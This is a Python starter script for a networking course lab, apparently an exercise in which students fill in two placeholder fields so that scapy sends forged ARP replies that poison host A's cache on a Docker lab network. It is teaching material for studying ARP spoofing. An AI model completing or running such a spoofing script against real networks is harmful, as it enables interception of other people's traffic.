"""NET412 L2A starter. Edit only the two TODO values, then run this file in the terminal."""
import sys
from scapy.all import ARP, Ether, get_if_hwaddr, getmacbyip, sendp

host_a_ip = "10.77.12.10"
server_1_ip = "10.77.12.20"
iface = "eth0"
host_a_mac = getmacbyip(host_a_ip)
host_b_mac = get_if_hwaddr(iface)

# TODO: The ARP reply should claim to be from server_1, at host_b's MAC.
forged_sender_ip = "REPLACE_WITH_SERVER_1_IP"
forged_sender_mac = "REPLACE_WITH_HOST_B_MAC"

if not host_a_mac or forged_sender_ip.startswith("REPLACE_") or forged_sender_mac.startswith("REPLACE_"):
    raise SystemExit("Check the two sender fields in /work/poison_student.py")
if "--check" in sys.argv:
    print("Scaffold fields ready")
    raise SystemExit(0)

packet = Ether(src=host_b_mac, dst=host_a_mac) / ARP(
    op=2, psrc=forged_sender_ip, pdst=host_a_ip,
    hwsrc=forged_sender_mac, hwdst=host_a_mac,
)
sendp(packet, iface=iface, count=16, inter=0.25, verbose=False)
print("Sent 16 forged ARP replies inside the NET412 Docker network")
